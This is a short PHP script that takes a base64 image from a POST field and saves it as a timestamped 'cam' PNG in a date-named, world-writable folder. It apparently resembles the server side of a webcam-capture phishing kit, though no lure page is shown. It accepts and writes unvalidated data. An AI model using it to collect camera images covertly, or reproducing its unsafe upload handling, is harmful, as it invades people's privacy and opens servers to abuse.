<?php

$date = date('dMYHis');
$imageData=$_POST['cat'];

if (!empty($_POST['cat'])) {
error_log("Received" . "\r\n", 3, "Log.log");

}

// Create folder name with current date only
// Format: YYYY-MM-DD (e.g., 2026-02-03)
$folderName = date('Y-m-d');

// Create folder if it doesn't exist
if (!file_exists($folderName)) {
    mkdir($folderName, 0777, true);
}

$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);
$filePath = $folderName . '/cam' . $date . '.png';
$fp = fopen($filePath, 'wb');
fwrite($fp, $unencodedData);
fclose($fp);

exit();
?>

